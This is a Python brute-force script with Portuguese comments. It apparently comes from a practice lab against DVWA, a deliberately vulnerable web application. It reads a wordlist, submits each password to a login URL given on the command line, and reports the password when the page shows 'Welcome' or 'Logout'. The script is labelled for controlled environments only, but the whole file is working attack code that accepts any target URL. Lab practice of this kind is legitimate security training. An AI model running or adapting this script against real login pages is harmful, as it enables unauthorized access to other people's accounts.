#!/usr/bin/env python3
# dvwa_bruteforce.py - script exemplo para automatizar tentativas de login no DVWA (APENAS EM AMBIENTE CONTROLADO)
import requests
from urllib.parse import urljoin
import sys

if len(sys.argv) < 4:
    print('Uso: python3 dvwa_bruteforce.py <DVWA_LOGIN_URL> <usuario> <wordlist_file>')
    print('Ex: python3 dvwa_bruteforce.py http://192.168.56.101/dvwa/login.php admin wordlists/small-words.txt')
    sys.exit(1)

DVWA_URL = sys.argv[1]
USER = sys.argv[2]
WORDLIST = sys.argv[3]

s = requests.Session()
for pwd in open(WORDLIST):
    pwd = pwd.strip()
    data = {'username': USER, 'password': pwd, 'Login': 'Login'}
    r = s.post(DVWA_URL, data=data, allow_redirects=True)
    # Ajuste a string de sucesso conforme sua versão do DVWA
    if 'Welcome' in r.text or 'Logout' in r.text:
        print(f'[+] Senha encontrada: {pwd}')
        break
    else:
        print(f'[-] Tentativa: {pwd}')
